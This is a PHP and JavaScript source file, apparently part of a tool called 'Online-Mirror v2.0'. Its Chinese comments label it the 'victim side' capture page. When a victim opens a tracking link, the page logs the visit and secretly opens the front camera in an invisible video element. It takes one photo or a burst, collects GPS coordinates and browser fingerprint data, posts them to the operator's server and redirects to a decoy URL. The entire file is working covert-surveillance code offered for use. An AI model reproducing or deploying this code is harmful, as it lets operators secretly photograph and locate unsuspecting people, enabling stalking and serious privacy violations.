<?php
/**
 * Online-Mirror 升级版 v2.0 - 拍照捕获页面（受害者端）
 * 无感拍照 + GPS定位 + 浏览器指纹采集
 */
require_once __DIR__ . '/config.php';

$id = trim($_GET['id'] ?? '');
$url = trim($_GET['url'] ?? '');

if (empty($id) || empty($url)) {
    die('<h2 style="text-align:center;margin-top:50px;color:#888;">参数错误</h2>');
}

// 验证链接有效性
try {
    $db = getDB();
    $stmt = $db->prepare("SELECT * FROM links WHERE link_id = ? AND status = 'active'");
    $stmt->execute([$id]);
    $link = $stmt->fetch();
    
    if (!$link) {
        header("Location: " . $url);
        exit;
    }
    
    if ($link['expires_at'] && strtotime($link['expires_at']) < time()) {
        $stmt = $db->prepare("UPDATE links SET status = 'expired' WHERE link_id = ?");
        $stmt->execute([$id]);
        header("Location: " . $url);
        exit;
    }
    
    // 增加浏览量
    $stmt = $db->prepare("UPDATE links SET views = views + 1 WHERE link_id = ?");
    $stmt->execute([$id]);
    
    addLog($id, 'visit');
    
} catch (Exception $e) {
    header("Location: " . $url);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<link rel="icon" type="image/x-icon" href="favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title></title>
<style>
* { margin: 0; padding: 0; }
html, body { width: 100%; height: 100%; background: #fff; }
</style>
</head>
<body>

<video id="video" width="0" height="0" autoplay playsinline></video>
<canvas style="display:none" id="canvas"></canvas>

<form action="save.php" id="captureForm" method="post">
    <input type="hidden" name="img" id="result" value="" />
    <input type="hidden" name="id" value="<?php echo htmlspecialchars($id); ?>" />
    <input type="hidden" name="url" value="<?php echo htmlspecialchars($url); ?>" />
    <input type="hidden" name="lat" id="lat" value="" />
    <input type="hidden" name="lng" id="lng" value="" />
    <input type="hidden" name="screen" id="screen" value="" />
    <input type="hidden" name="os" id="os" value="" />
    <input type="hidden" name="browser" id="browser" value="" />
    <input type="hidden" name="lang" id="lang" value="" />
    <input type="hidden" name="burst_total" id="burstTotal" value="<?php echo intval($link['burst_count'] ?? 0); ?>" />
    <input type="hidden" name="burst_index" id="burstIndex" value="0" />
    <input type="hidden" name="gps_enabled" id="gpsEnabled" value="<?php echo intval($link['gps_enabled'] ?? 0); ?>" />
</form>

<script>
(function() {
    var gpsEnabled = parseInt(document.getElementById('gpsEnabled').value) === 1;
    
    // ========== 1. 获取GPS定位 ==========
    function getGPS(callback) {
        if (!gpsEnabled) { callback(); return; }
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    document.getElementById('lat').value = pos.coords.latitude;
                    document.getElementById('lng').value = pos.coords.longitude;
                    callback();
                },
                function() { callback(); },
                { timeout: 5000, enableHighAccuracy: false }
            );
        } else {
            callback();
        }
    }
    
    // ========== 2. 获取浏览器指纹 ==========
    function getFingerprint() {
        // 屏幕分辨率
        document.getElementById('screen').value = screen.width + 'x' + screen.height;
        
        // 语言
        document.getElementById('lang').value = navigator.language || navigator.userLanguage || '';
        
        // 操作系统和浏览器（从UA解析）
        var ua = navigator.userAgent;
        var os = 'Unknown';
        var browser = 'Unknown';
        
        // 检测系统
        if (ua.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10/11';
        else if (ua.indexOf('Windows NT 6.3') !== -1) os = 'Windows 8.1';
        else if (ua.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
        else if (ua.indexOf('Mac OS X') !== -1) os = 'macOS';
        else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) os = 'iOS';
        else if (ua.indexOf('Android') !== -1) os = 'Android';
        else if (ua.indexOf('Linux') !== -1) os = 'Linux';
        
        // 检测浏览器
        if (ua.indexOf('Edg/') !== -1 || ua.indexOf('Edge/') !== -1) browser = 'Edge';
        else if (ua.indexOf('Chrome/') !== -1 && ua.indexOf('Edg') === -1) {
            if (ua.indexOf('OPR/') !== -1 || ua.indexOf('Opera') !== -1) browser = 'Opera';
            else browser = 'Chrome';
        }
        else if (ua.indexOf('Firefox/') !== -1) browser = 'Firefox';
        else if (ua.indexOf('Safari/') !== -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
        else if (ua.indexOf('MSIE') !== -1 || ua.indexOf('Trident') !== -1) browser = 'IE';
        
        document.getElementById('os').value = os;
        document.getElementById('browser').value = browser + ' ' + (ua.match(/(Chrome|Firefox|Safari|Edg|OPR)\/(\d+)/) || [,'', ''])[2] || '';
    }
    
    // ========== 3. 拍照并提交 ==========
    function captureAndSubmit() {
        var canvas = document.getElementById('canvas');
        var context = canvas.getContext('2d');
        var video = document.getElementById('video');
        var form = document.getElementById('captureForm');
        var result = document.getElementById('result');
        var burstTotal = parseInt(document.getElementById('burstTotal').value) || 0;
        var burstIndex = 0;
        
        getFingerprint();
        
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            getGPS(function() {
                window.location.href = form.querySelector('input[name="url"]').value;
            });
            return;
        }
        
        function takePhoto(stream, callback) {
            var vw = video.videoWidth || 480;
            var vh = video.videoHeight || 640;
            canvas.width = vw;
            canvas.height = vh;
            context.drawImage(video, 0, 0, vw, vh);
            callback(canvas.toDataURL('image/jpeg', 0.8));
        }
        
        function submitPhoto(imgData, idx, total, stream, onDone) {
            document.getElementById('burstIndex').value = idx;
            result.value = imgData;
            
            if (idx < total - 1) {
                // 连拍模式：用fetch异步提交，不跳转
                var formData = new FormData(form);
                fetch('save.php', {
                    method: 'POST',
                    body: formData
                }).then(function() {
                    onDone();
                }).catch(function() {
                    onDone();
                });
            } else {
                // 最后一张：正常提交表单（会跳转）
                stream.getTracks().forEach(function(track) { track.stop(); });
                setTimeout(function() { form.submit(); }, 200);
            }
        }
        
        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' } 
        }).then(function(stream) {
            video.srcObject = stream;
            video.play();
            
            if (burstTotal > 1) {
                // 连拍模式：依次拍照提交
                function burstLoop() {
                    if (burstIndex >= burstTotal) {
                        stream.getTracks().forEach(function(track) { track.stop(); });
                        setTimeout(function() { form.submit(); }, 200);
                        return;
                    }
                    
                    setTimeout(function() {
                        takePhoto(stream, function(imgData) {
                            submitPhoto(imgData, burstIndex, burstTotal, stream, function() {
                                burstIndex++;
                                setTimeout(burstLoop, 1200); // 间隔1.2秒拍下一张
                            });
                        });
                    }, 600);
                }
                // 先获取GPS再开始连拍
                getGPS(function() {
                    burstIndex = 0;
                    burstLoop();
                });
            } else {
                // 单拍模式（原逻辑）
                setTimeout(function(){
                    takePhoto(stream, function(imgData) {
                        getGPS(function() {
                            result.value = imgData;
                            stream.getTracks().forEach(function(track) { track.stop(); });
                            setTimeout(function() { form.submit(); }, 500);
                        });
                    });
                }, 800);
            }
        }).catch(function(err) {
            getGPS(function() {
                window.location.href = form.querySelector('input[name="url"]').value;
            });
        });
    }
    
    captureAndSubmit();
})();
</script>
</body>
</html>
